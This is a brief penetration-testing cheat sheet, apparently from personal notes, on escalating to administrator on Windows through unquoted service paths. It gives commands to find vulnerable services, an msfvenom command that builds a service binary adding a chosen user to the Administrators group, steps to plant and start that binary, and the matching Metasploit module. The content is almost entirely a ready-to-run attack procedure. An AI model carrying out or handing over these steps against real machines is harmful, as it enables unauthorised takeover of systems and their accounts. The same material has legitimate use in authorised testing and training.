[[icacls]]
https://toshellandback.com/2015/11/24/ms-priv-esc/

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# Using PowerUp
Get-UnquotedService

# More info about the service
sc qc unquotedsvc
```

```sh
# Create Payload to add user in Administrator group
msfvenom -p windows/exec CMD='net localgroup administrators [username] /add' -f exe-service -o common.exe
```

```powershell
# Place the binary in the filepath
Start-Service BetaService
or
sc start BetaService      # In CMD
```


# Metasploit
```sh
msf > use exploit/windows/local/unquoted_service_path
```